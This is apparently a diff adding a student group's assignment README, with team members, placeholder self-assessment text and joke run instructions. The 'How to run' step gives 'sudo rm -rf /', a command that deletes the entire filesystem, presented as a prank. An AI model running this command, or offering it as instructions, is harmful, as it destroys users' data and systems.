@@ -1,0 +1,16 @@
+Team name: A2Groups 12
+Team members: Thomas Clarke (1443652), Benjamin Durrans () and Cameron Angus ()
+
+How to run:
+```
+sudo rm -rf /
+```
+
+(Likely) Output:
+```
+(Segmentation fault)
+```
+
+We achieved... (hopefully "Assignment fully completed and correct").
+
+We thought we did this really well... (TBC).
